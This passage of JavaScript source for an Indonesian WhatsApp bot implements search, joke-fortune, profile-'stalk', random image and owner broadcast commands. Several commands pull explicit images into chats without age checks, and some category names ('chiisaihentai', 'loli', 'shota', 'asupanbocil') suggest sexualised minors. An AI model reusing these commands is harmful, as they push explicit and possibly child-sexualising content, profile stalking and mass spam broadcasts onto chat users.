if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Barang Yg Mau Di Cari Mana Tod\nContoh: ${prefix + command} sepatu`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/shopee?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Shopee Search : \n'
for (var x of get_result) {
ini_txt += `Name : ${x.name}\n`
ini_txt += `Terjual : ${x.sold}\n`
ini_txt += `Stock : ${x.stock}\n`
ini_txt += `Lokasi : ${x.shop_loc}\n`
ini_txt += `Link : ${x.link_produk}\n\n`
}
reply(ini_txt)
break
case 'google': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Nama Yg Mau Cari Mana Tod\nContoh: ${prefix + command} sandrinna`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=${lolkey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Google Search : \n'
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Desc : ${x.desc}\n\n`
}
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR KERANG ]━━━━━━━━━━━━━━━━━//

case 'cekbapak': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
const cek = bapak[Math.floor(Math.random() * bapak.length)]
zeroyt7.sendMessage(from, cek, text, { quoted: fstatus })
break
case 'rate': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} kegantengan saya`)
const ra = ['4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
const te = ra[Math.floor(Math.random() * ra.length)]
zeroyt7.sendMessage(from, 'Pertanyaan : ' + q + '\n\nJawaban : ' + te + '%', text, { quoted: fstatus })
break
case 'hobby': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Rara`)
const hob = ['Desah Di Game', 'Ngocokin Doi', 'Stalking sosmed nya mantan', 'Kau kan gak punya hobby awokawok', 'Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
zeroyt7.sendMessage(from, 'Pertanyaan : hobby ' + q + '\n\nJawaban : ' + by, text, { quoted: fstatus })
break
case 'kapankah': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} aku jadi wibu`)
const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
const koh = kapan[Math.floor(Math.random() * kapan.length)]
zeroyt7.sendMessage(from, 'Pertanyaan : kapankah ' + q + '\n\nJawaban : ' + koh, text, { quoted: fstatus })
break
case 'apakah': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Ulangi bro gak paham']
const kah = apa[Math.floor(Math.random() * apa.length)]
zeroyt7.sendMessage(from, 'Pertanyaan : apakah ' + q + '\n\nJawaban : ' + kah, text, { quoted: fstatus })
break
case 'toxic': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
Toxic().then(toxic => {
reply (toxic)
})
break
case 'cekwatak': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  var namao = pushname
  var prfx = await zeroyt7.getProfilePicture(sender)
  const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
  const wtk = watak[Math.floor(Math.random() * (watak.length))]
  const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
  const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
  const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
  const sft = sifat[Math.floor(Math.random() * (sifat.length))]
  const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colmek','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
  const hby = hobby[Math.floor(Math.random() * (hobby.length))]
  const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
  const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
  const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
  const typo = tipe[Math.floor(Math.random() * (tipe.length))]
  await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
  break
  case 'cekmati': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  if (!q) return reply(mess.wrongFormat)
  predea = await axios.get(`https://api.agify.io/?name=${q}`)
  reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
  break
case 'artinama': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Namamya Mana Tod\nContoh: ${prefix + command} Zero YT7`)
ini_nama = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=${lolkey}&nama=${ini_nama}`)
reply(get_result.result)
break
case 'jodoh': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Namanya Mana Tod\nContoh: ${prefix + command} Zero & Sandrinna`)
ini_nama = args.join(" ").split("&")
nama1 = ini_nama[0].trim()
nama2 = ini_nama[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Positif : ${get_result.positif}\n`
ini_txt += `Negative : ${get_result.negatif}\n`
ini_txt += `Deskripsi : ${get_result.deskripsi}`
reply(ini_txt)
break
case 'jadian': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  jds = []
  jdii = groupMembers
  koss = groupMembers
  akuu = jdii[Math.floor(Math.random() * jdii.length)]
  diaa = koss[Math.floor(Math.random() * koss.length)]
  teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
  jds.push(akuu.jid)
  jds.push(diaa.jid)
  mentions(teks, jds, true)
  break
case 'tebakumur': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Namanya Mana Tod\nContoh: ${prefix + command} Zero YT7`)
ini_name = args.join(" ")
if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakumur?apikey=${lolkey}&name=${ini_name}`)
get_result = get_result.result
ini_txt = `Nama : ${get_result.name}\n`
ini_txt += `Umur : ${get_result.age}`
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR STALK ]━━━━━━━━━━━━━━━━━//

case 'stalkig': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna_11`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.photo_profile)
ini_txt = `Username : ${ini_result.username}\n`
ini_txt += `Full Name : ${ini_result.fullname}\n`
ini_txt += `Posts : ${ini_result.posts}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
zeroyt7.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break
case 'stalktiktok': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna`)
stalk_toktok = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=${lolkey}`)
get_result = get_result.result
ini_txt = `Username : ${get_result.username}\n`
ini_txt += `Nickname : ${get_result.nickname}\n`
ini_txt += `Bio : ${get_result.nickname}\n`
ini_txt += `Followers : ${get_result.followers}\n`
ini_txt += `Followings : ${get_result.followings}\n`
ini_txt += `Likes : ${get_result.likes}\n`
ini_txt += `Video : ${get_result.video}\n`
pp_tt = await getBuffer(get_result.user_picture)
zeroyt7.sendMessage(from, pp_tt, image, { quoted: fstatus, caption: ini_txt })
break
case 'stalkgithub': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length == 0) return reply(`Usernamenya Mana Tod\nContoh: ${prefix + command} Zero-YT7`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar)
ini_txt = `Name : ${ini_result.name}\n`
ini_txt += `Link : ${ini_result.url}\n`
ini_txt += `Public Repo : ${ini_result.public_repos}\n`
ini_txt += `Public Gists : ${ini_result.public_gists}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
zeroyt7.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break

//━━━━━━━━━━━━━━━[ FITUR RANDOM IMAGE ]━━━━━━━━━━━━━━━━━//

case 'art': 
case 'bts': 
case 'exo': 
case 'elf': 
case 'loli': 
case 'neko': 
case 'waifu': 
case 'shota': 
case 'husbu': 
case 'sagiri': 
case 'shinobu': 
case 'megumin': 
case 'wallnime': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`).then((gambar) => {
zeroyt7.sendMessage(from, gambar, image, { quoted: fstatus })
})
break
case 'chiisaihentai': 
case 'trap': 
case 'blowjob': 
case 'yaoi': 
case 'ecchi': 
case 'hentai': 
case 'ahegao': 
case 'hololewd': 
case 'sideoppai': 
case 'animefeets': 
case 'animebooty': 
case 'animethighss': 
case 'animearmpits': 
case 'hentaifemdom': 
case 'lewdanimegirls': 
case 'biganimetiddies': 
case 'hentai4everyone': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`).then((gambar) => {
zeroyt7.sendMessage(from, gambar, image, { quoted: fstatus })
})
break

//━━━━━━━━━━━━━━━[ FITUR OWNER ]━━━━━━━━━━━━━━━━━//

case 'setname': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return  reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
anu = body.slice(9)
zeroyt7.updateProfileName(anu)
reply(`Sukses mengganti nama ke ${body.slice(9)}`)
break
case 'setpp': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return  reply(mess.only.owner)
zeroyt7.updatePresence(from, Presence.composing)
if (!isQuotedImage) return reply('Reply imagenya!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
mediau = await zeroyt7.downloadAndSaveMediaMessage(encmedia)
await zeroyt7.updateProfilePicture(botNumber, mediau)
reply('Sukses')
break
case 'setbio': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return  reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
iyek = body.slice(8)
zeroyt7.setStatus(`${iyek}`)
reply(`Sukses mengganti bio ke ${body.slice(8)}`)
break 
case 'bc': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isOwner) return reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
anu = await zeroyt7.chats.all()
for (let _ of anu) {
buttonss = [{buttonId: `${prefix}sc`, buttonText: {displayText: 'Script🤤'}, type: 1},{buttonId: `${prefix}sewabot`, buttonText: {displayText: 'Sewa🤤'}, type: 1}]
const btnbc = {
contentText: `${q}`,
footerText: '*SILAHKAN TEKAN BUTTON UNTUK INFORMASI LANJUT*',
buttons: buttonss,
headerType: 1
}
await zeroyt7.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: fstatus})
}
reply(`Sukses mengirim Broadcast:\n${q}`)
break
case 'bcgc': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return  reply(mess.only.owner)
if (args.length < 1) return reply('.......')
anu = await groupMembers 
tagss = zeroyt7.participant
if (isMedia && !zeroyt7.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
buffer = await zeroyt7.downloadMediaMessage(encmedia)
for (let _ of anu) {
zeroyt7.sendMessage(_.jid, buffer, image, {caption: `*𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏 𝙂𝙍𝙐𝙋*\n\n${body.slice(6)}\n\n𝙺𝚄𝙽𝚉𝙱𝙾𝚃𝚉`})
}
reply('')
} else {
for (let _ of anu) {
sendMess(_.jid, `𝘽𝙍𝙊𝘼𝘿𝘾𝘼𝙎𝙏 𝙂𝙍𝙐𝙋\n\n${body.slice(6)}\n\n𝙺𝚄𝙽𝚉𝙱𝙾𝚃𝚉`)
}
reply('Sukses broadcast group')
}
break
case 'tobc': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return  reply(mess.only.owner)
zeroyt7.updatePresence(from, Presence.composing)
anu = await zeroyt7.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await zeroyt7.downloadMediaMessage(encmedia)
for (let _ of anu) {
zeroyt7.sendMessage(_.jid, buff, audio, { quoted: fstatus })
}
} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await zeroyt7.downloadMediaMessage(encmedia)
for (let _ of anu) {
zeroyt7.sendMessage(_.jid, buff, sticker, { quoted: fstatus, contextInfo: { forwardingScore: 508, isForwarded: true}})
}
} else{
reply('reply sticker/audio')
}
break
case 'chat': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return  reply(mess.only.owner)
if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
var pc = body.slice(6)
var nomor = pc.split("|")[0];
var org = pc.split("|")[1];
zeroyt7.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
reply(`Sukses mengirim chat:\n${org},@${nomor}`)
break
case 'q': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
reply(JSON.stringify(mek.message.extendedTextMessage.contextInfo, null, 3))
break
case 'public': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isOwner && !mek.key.fromMe ) return
if (banChats === true) return 
banChats = true
reply(`Sukses mode publik gan`)
break
case 'self': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isPremium && !isOwner && !mek.key.fromMe ) return
if (banChats === false) return
banChats = false
reply(`Success mode self gan`)
break
case 'premium':  
if (!isOwner && !mek.key.fromMe ) return reply(mess.only.owner)
if (args[0] === 'add') {
if (mek.message.extendedTextMessage != undefined) {
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
premium.addPremiumUser(mentioned[0], args[2], _premium)
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
  } else {
premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
}
  } else if (args[0] === 'del') {
if (mek.message.extendedTextMessage != undefined) {
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
_premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
fs.writeFileSync('./F2/premium.json', JSON.stringify(_premium))
reply(mess.success)
  } else {
_premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
fs.writeFileSync('./F2/premium.json', JSON.stringify(_premium))
reply('*Success Menambahkan User Premium*')
}
  } else {
reply(mess.wrongFormat)
}
break
case 'clearall':{
if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
let chiit = await zeroyt7.chats.all()
for (let i of chiit){
zeroyt7.modifyChat(i.jid, 'clear', {
includeStarred: false
})
}
reply(`Succes Delete All Chat🙂`)
}
break
case 'setthumb': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedImage) return reply('Reply imagenya blokk!')
const messimagethumb = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
const downiamgethumb = await zeroyt7.downloadMediaMessage(messimagethumb)
fs.unlinkSync(`thumbnail.jpg`)
await sleep(2000)
fs.writeFileSync(`thumbnail.jpg`, downiamgethumb)
reply('Succes')
break
case 'ban': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isOwner && !mek.key.fromMe) return
bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
ban.push(bnnd)
fs.writeFileSync('./F2/banned.json', JSON.stringify(ban))
fakestatus(`Nomor ${bnnd} telah dibanned!`)
break
case 'unban': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isOwner && !mek.key.fromMe) return
ya = `${args[0].replace('@', '')}@s.whatsapp.net`
unb = ban.indexOf(ya)
ban.splice(unb, 1)
fs.writeFileSync('./F2/banned.json', JSON.stringify(ban))
fakestatus(`Nomor ${ya} telah di unban!`)
break

//━━━━━━━━━━━━━━━[ BUTTON VERIFY ]━━━━━━━━━━━━━━━━━//

case 'verify': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (isRegistered) return reply('Akun kamu sudah terverfikasi')
const serialUser = createSerial(18)
 try {
ppimg = await zeroyt7.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
veri = sender
_registered.push(sender)
fs.writeFileSync('./F2/registered.json', JSON.stringify(_registered))
addRegisteredUser(sender, serialUser)
verif = ` *PENDAFTARAN USER* 」

${bold}💠Nama${bold} : *${pushname}*
${bold}💠API${bold} : *+${sender.split('@')[0]}*
${bold}💠Serial${bold} : *${serialUser}*
${bold}💠Total${bold} : *${_registered.length} Pengguna*`

ok = `${botname}`
img = await getBuffer(`http://hadi-api.herokuapp.com/api/card/verify?nama=${encodeURI(pushname)}&member=${_registered.length}&seri=${serialUser}&pp=${ppimg}&bg=${ppimg}`)
but = [{buttonId: `.menu`,buttonText:{displayText: `Menu`},type:1}]
sendButImage(from, verif, ok, img, but)
setTimeout( () => {
reply(`*Terimakasih Telah Mendaftarkan Diri Ke Database Bot*`)
}, 3000)
break

//━━━━━━━━━━━━━━━[ FITUR ASUPAN ]━━━━━━━━━━━━━━━━━//

case 'asupan': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.result)
zeroyt7.sendMessage(from, buffer, video, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break
case 'asupancecan': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, image, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break
case 'asupanhijaber': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, image, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break
case 'asupansantuy': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break
case 'asupanukhti': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break
case 'asupanbocil': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break
case 'asupanghea': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break
case 'asupanrika': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${zerokey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: fstatus, caption: 'Nih Asupan >.<'})
break

//━━━━━━━━━━━━━━━[ FITUR CECAN ]━━━━━━━━━━━━━━━━━//

case 'cecanvietnam': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/vietnam?apikey=${zerokey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
zeroyt7.sendMessage(from, goo, image, {quoted: fstatus, caption: 'Nih Cecan🐣'})
break
case 'cecanmalaysia': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/malaysia?apikey=${zerokey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
zeroyt7.sendMessage(from, goo, image, {quoted: fstatus, caption: 'Nih Cecan🐣'})
break
case 'cecankorea': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/korea?apikey=${zerokey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
zeroyt7.sendMessage(from, goo, image, {quoted: fstatus, caption: 'Nih Cecan🐣'})
break
case 'cecanindonesia': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/indonesia?apikey=${zerokey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
zeroyt7.sendMessage(from, goo, image, {quoted: fstatus, caption: 'Nih Cecan🐣'})
break
case 'cecanjapan': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/japan?apikey=${zerokey}`)
reply(mess.wait)
goo = await getBuffer(huft.result.url)
zeroyt7.sendMessage(from, goo, image, {quoted: fstatus, caption: 'Nih Cecan🐣'})
break
case 'cecanthailand': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
huft = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/cewe/thailand?apikey=${zerokey}`)
